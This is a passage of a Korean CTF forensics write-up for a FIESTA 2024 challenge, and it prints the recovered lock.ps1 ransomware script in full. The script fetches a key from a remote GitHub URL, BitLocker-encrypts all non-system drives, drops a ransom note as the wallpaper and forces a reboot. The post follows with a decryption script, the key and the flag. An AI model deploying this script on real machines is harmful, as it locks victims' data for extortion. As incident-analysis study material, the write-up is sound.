</span><span class="nv">$Url2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/readme.txt"</span><span class="w">
</span><span class="nv">$desktopPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">"Desktop"</span><span class="p">)</span><span class="w">
</span><span class="nv">$destinationPath1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"note.jpg"</span><span class="w">
</span><span class="nv">$destinationPath2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"readme.txt"</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$Url1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$destinationPath1</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$Url2</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$destinationPath2</span><span class="w">
</span><span class="nv">$imageFileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"note.jpg"</span><span class="w">
</span><span class="nv">$imagePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="nv">$imageFileName</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public class Wallpaper
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@</span><span class="w">
</span><span class="nv">$SPI_SETDESKWALLPAPER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20</span><span class="w">
</span><span class="nv">$SPIF_UPDATEINIFILE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x01</span><span class="w">
</span><span class="nv">$SPIF_SENDCHANGE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x02</span><span class="w">
</span><span class="p">[</span><span class="n">Wallpaper</span><span class="p">]::</span><span class="nx">SystemParametersInfo</span><span class="p">(</span><span class="nv">$SPI_SETDESKWALLPAPER</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$imagePath</span><span class="p">,</span><span class="w"> </span><span class="nv">$SPIF_UPDATEINIFILE</span><span class="w"> </span><span class="o">-bor</span><span class="w"> </span><span class="nv">$SPIF_SENDCHANGE</span><span class="p">)</span><span class="w">
</span><span class="n">Restart-Computer</span><span class="w"> </span><span class="nt">-Force</span><span class="w">

</span></code></pre></div></div> <p><br /></p> <p>이렇게 lock.ps1를 구할 수 있었다.</p> <p><br /> <br /></p> <h1 id="4-암호화-쉘스크립트-분석lockps1">4. 암호화 쉘스크립트 분석(lock.ps1)</h1> <p><br /></p> <p>BitLocker로 암호화했을 때의 CipherSuite를 뜯어보자.</p> <ol> <li>암호화에 사용된 응용: BitLocker</li> <li>암호화에 사용된 키값: <code class="language-plaintext highlighter-rouge">https://raw.githubusercontent.com/imnothackerkkk/key/main/secret</code>에서 다운로드된 컨텐츠 <ol> <li>앞에서 이미 확인했지만, <code class="language-plaintext highlighter-rouge">Giveme the100BTC!!!</code> 이다.</li> </ol> </li> <li>암호화 루틴: AES128</li> </ol> <p>이제 두번째 문항도 해결했다.</p> <blockquote> <p><mark>(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll</mark></p> <p><mark>(2) 비트라커의 평문키: Giveme the100BTC!!!</mark></p> <p>(3) 암호화된 파티션 내부 설계도면에 적힌 가격</p> </blockquote> <p>이제 암호화된 파티션 내부 설계도면을 확보해 보자.</p> <p><br /></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lock.ps1</span><span class="w">

</span><span class="n">Start-Process</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"-NoProfile -ExecutionPolicy Bypass -Command &amp; { </span><span class="nv">$scriptBlock</span><span class="s2"> }"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">LocalMachine</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$rawUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/secret"</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$fileContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$rawUrl</span><span class="w">
</span><span class="nv">$volumes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-BitLockerVolume</span><span class="w">
</span><span class="nv">$osVolume</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_OperatingSystem</span><span class="p">)</span><span class="o">.</span><span class="nf">SystemDrive</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-String</span><span class="w"> </span><span class="nv">$fileContent</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$volumes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nv">$osVolume</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Enable-BitLocker</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="nt">-EncryptionMethod</span><span class="w"> </span><span class="nx">Aes128</span><span class="w"> </span><span class="nt">-PasswordProtector</span><span class="w"> </span><span class="nv">$key</span><span class="w">
	</span><span class="n">Disable-BitLockerAutoUnlock</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w">
        </span><span class="nx">Get-BitLockerVolume</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$Url1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/ransomnote.jpg"</span><span class="w">
</span><span class="nv">$Url2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/readme.txt"</span><span class="w">
</span><span class="nv">$desktopPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Environment</span><span class="p">]::</span><span class="n">GetFolderPath</span><span class="p">(</span><span class="s2">"Desktop"</span><span class="p">)</span><span class="w">
</span><span class="nv">$destinationPath1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"note.jpg"</span><span class="w">
</span><span class="nv">$destinationPath2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="s2">"readme.txt"</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$Url1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$destinationPath1</span><span class="w">
</span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$Url2</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$destinationPath2</span><span class="w">
</span><span class="nv">$imageFileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"note.jpg"</span><span class="w">
</span><span class="nv">$imagePath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$desktopPath</span><span class="w"> </span><span class="nt">-ChildPath</span><span class="w"> </span><span class="nv">$imageFileName</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public class Wallpaper
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@</span><span class="w">
</span><span class="nv">$SPI_SETDESKWALLPAPER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20</span><span class="w">
</span><span class="nv">$SPIF_UPDATEINIFILE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x01</span><span class="w">
</span><span class="nv">$SPIF_SENDCHANGE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x02</span><span class="w">
</span><span class="p">[</span><span class="n">Wallpaper</span><span class="p">]::</span><span class="nx">SystemParametersInfo</span><span class="p">(</span><span class="nv">$SPI_SETDESKWALLPAPER</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$imagePath</span><span class="p">,</span><span class="w"> </span><span class="nv">$SPIF_UPDATEINIFILE</span><span class="w"> </span><span class="o">-bor</span><span class="w"> </span><span class="nv">$SPIF_SENDCHANGE</span><span class="p">)</span><span class="w">
</span><span class="n">Restart-Computer</span><span class="w"> </span><span class="nt">-Force</span><span class="w">

</span></code></pre></div></div> <p><br /></p> <p>해당 코드를 보면, 시스템 폴더가 위치해 있는 드라이브를 제외하고 이외 드라이브를 암호화하는 모습을 볼 수 있다. 전형적인 랜섬웨어 수법이다.</p> <p>따라서 이외 D, E등의 파티션이 암호화됐을 텐데,</p> <p>이건 FTK Imager로 해결될 게 아니니 침해당한 시스템상에서 복호화 스크립트를 돌리는 것으로 하자.</p> <p>그냥 저 쉘 스크립트 그대로 응용해서 복호화 루틴 짜면 될 듯?</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Start-Process</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"-NoProfile -ExecutionPolicy Bypass -Command &amp; { </span><span class="nv">$scriptBlock</span><span class="s2"> }"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">LocalMachine</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$rawUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/secret"</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$fileContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$rawUrl</span><span class="w">
</span><span class="nv">$volumes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-BitLockerVolume</span><span class="w">
</span><span class="nv">$osVolume</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_OperatingSystem</span><span class="p">)</span><span class="o">.</span><span class="nf">SystemDrive</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-String</span><span class="w"> </span><span class="nv">$fileContent</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$volumes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nv">$osVolume</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Unlock-BitLocker</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nv">$key</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span></code></pre></div></div> <p>MS에서 BitLocker 스펙 문서 보니까 어떻게 하면 되는지 나와있어서</p> <p>그 점 참고하여 스크립트 작성했다.</p> <p>굳이 내가 복호화키를 hardcode 하지 않은 이유는, 저게 rawdata를 네트워크로 가져오는 거라 Key value로 interpreting 할 때 변수가 생길 것 같아서이다.</p> <p><br /></p> <p>그렇게 실행한 결과,</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2040.png" alt="image.png" width="80%" height="80%" /></p> <p>암호화를 해제할 수 있었다.</p> <p><br /></p> <p>그리고 암호화된 설계도면도 확인할 수 있었다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2041.png" alt="image.png" width="80%" height="80%" /></p> <blockquote> <p>(1) dll인젝션에 사용된 dll 파일명 (.dll 포함): version.dll</p> <p>(2) 비트라커의 평문키: Giveme the100BTC!!!</p> <p>(3) 암호화된 파티션 내부 설계도면에 적힌 가격: 150000$</p> </blockquote> <p>따라서 <mark>FlAG: FIESTA{version.dll_Giveme the100BTC!!!_150000$}</mark></p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About TouBVA </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="https://touBVa.github.io/assets/img/authors/toubva.jpeg" alt="TouBVA" /> </div> <div class="col-md-6"> <p class="author_bio">A Security Researcher, now concentrating on Security Consulting.</p> <p>Email : touBVa@gmail.com</p> <p>Website : https://toubva.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/TouBVa" target="_blank"><i class="fab fa-github fa-fw"></i></a> <a class="social-link" href="https://www.linkedin.com/in/johndoe" target="_blank"><i class="fab fa-linkedin fa-fw"></i></a> <a class="social-link" href="https://www.youtube.com/channel/UCSfLBFFfNU9r6ihfei6VeJw" target="_blank"><i class="fab fa-youtube fa-fw"></i></a> <a class="social-link" href="https://www.facebook.com/johndoe" target="_blank"><i class="fab fa-facebook fa-fw"></i></a> <a class="social-link" href="https://www.twitter.com/johndoe" target="_blank"><i class="fab fa-twitter fa-fw"></i></a> </p> </div> </div> </div> </div> </div><!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <div id="disqus_thread", style="width: 90%; margin-left: 5%;"><script> var disqus_config = function () { this.page.url = "https://touBVa.github.io/blog/reversing/2025-02-02-FIESTA2024-cert1"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/reversing/FIESTA2024-cert1"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://toubva.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About TouBVa</div> <div class="card-body"> <p class="author_bio">Welcome to my world!</p><!-- Place this tag where you want the github button to render. --> <a class="github-button" href="https://github.com/touBVa/touBVa.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star my blog on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#dreamhack_system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/dreamhack_system_hacking">dreamhack_system_hacking</a> </li> <a name="dreamhack_system_hacking"></a> <div id="#system_hacking"></div> <li class="tag-head"> <a href="/blog/categories/system_hacking">system_hacking</a> </li> <a name="system_hacking"></a> <div id="#protostar"></div> <li class="tag-head"> <a href="/blog/categories/protostar">protostar</a> </li> <a name="protostar"></a> <div id="#certification_study"></div> <li class="tag-head"> <a href="/blog/categories/certification_study">certification_study</a> </li> <a name="certification_study"></a> <div id="#paper_study"></div> <li class="tag-head"> <a href="/blog/categories/paper_study">paper_study</a> </li> <a name="paper_study"></a> <div id="#network_hacking"></div> <li class="tag-head"> <a href="/blog/categories/network_hacking">network_hacking</a> </li> <a name="network_hacking"></a> <div id="#blockchain"></div> <li class="tag-head"> <a href="/blog/categories/blockchain">blockchain</a> </li> <a name="blockchain"></a> <div id="#reversing"></div> <li class="tag-head"> <a href="/blog/categories/reversing">reversing</a> </li> <a name="reversing"></a> <div id="#my_life"></div> <li class="tag-head"> <a href="/blog/categories/my_life">my_life</a> </li> <a name="my_life"></a> <div id="#web_hacking"></div> <li class="tag-head"> <a href="/blog/categories/web_hacking">web_hacking</a> </li> <a name="web_hacking"></a> <div id="#fuzzing"></div> <li class="tag-head"> <a href="/blog/categories/fuzzing">fuzzing</a> </li> <a name="fuzzing"></a> <div id="#forensic"></div> <li class="tag-head"> <a href="/blog/categories/forensic">forensic</a> </li> <a name="forensic"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="https://touBVa.github.io/">Home</a> </li> <li> <a href="https://touBVa.github.io/about">About</a> </li> <li> <a href="https://touBVa.github.io/blog">Blog</a> </li> <li> <a href="https://touBVa.github.io/contact">Contact</a> </li> </div> </div> </div> </div> </div> </div> <div class="col-lg-12" id="newsletter_footer"><!-- Mailchimp Newletters --> <form action=""method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate> <div id="mc_embed_signup_scroll_footer"> <label for="mce-EMAIL_footer"> Signup for Weekly Email Newsletters :D</label> <input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL_footer" placeholder="email address" required> <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups--> <div style="position: absolute; left: -5000px;" aria-hidden="true"> <input type="text" name="b_50bab1c85eae24ecfb0f68361_3a2dd721d0" tabindex="-1" value=""> </div><br /> <div class="clear"> <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe_footer" class="btn btn-lg btn-success"> </div> </div> </div><footer> <p> Powered by<a href="https://github.com/touBVa"> TouBVa</a>. Hosted at <a href="https://pages.github.com">Github</a>. Subscribe via <a href=" /feed.xml ">RSS</a> </p> </footer> <script> var options = { classname: 'progressline', id: 'my-id' }; var nanobar = new Nanobar( options ); nanobar.go( 30 ); nanobar.go( 76 ); nanobar.go(100); </script> <div hidden id="snipcart" data-api-key="Y2I1NTAyNWYtMTNkMy00ODg0LWE4NDItNTZhYzUxNzJkZTI5NjM3MDI4NTUzNzYyMjQ4NzU0"></div> <script src="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.js" defer></script> <script src="https://touBVa.github.io/assets/js/mode-switcher.js"></script> <!-- <script> if (window.netlifyIdentity) { window.netlifyIdentity.on("init", user => { if (!user) { window.netlifyIdentity.on("login", () => { document.location.href = "/admin/"; }); } }); } </script> --> </body> </html>
